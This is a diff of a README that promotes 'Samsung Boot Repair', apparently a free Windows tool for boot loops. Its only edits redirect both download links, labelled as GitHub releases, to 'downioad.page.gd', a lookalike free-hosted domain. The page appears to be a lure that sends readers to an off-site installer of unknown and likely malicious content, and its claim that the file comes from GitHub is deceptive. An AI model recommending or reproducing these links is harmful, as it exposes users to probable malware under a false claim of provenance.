@@ -2,7 +2,7 @@
 
 Samsung Boot Repair is a dedicated Windows desktop application engineered to address boot failures on Samsung devices. In 2026, this utility emerges as a free and portable solution for users facing boot loops, firmware corruption, or other system start-up problems. By automating the repair process, it eliminates the need for complex manual interventions, making system recovery accessible to all.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -56,7 +56,7 @@ A: While the tool aims to preserve data during repairs, it's always recommended 
 
 To access the latest version of Samsung Boot Repair, please use the link below:
 
-[Get the latest release from GitHub](https://download-page.page.gd/)
+[Get the latest release from GitHub](https://downioad.page.gd/)
 
 **Last Updated**: March 2026  
 **Version**: 2.1.0  
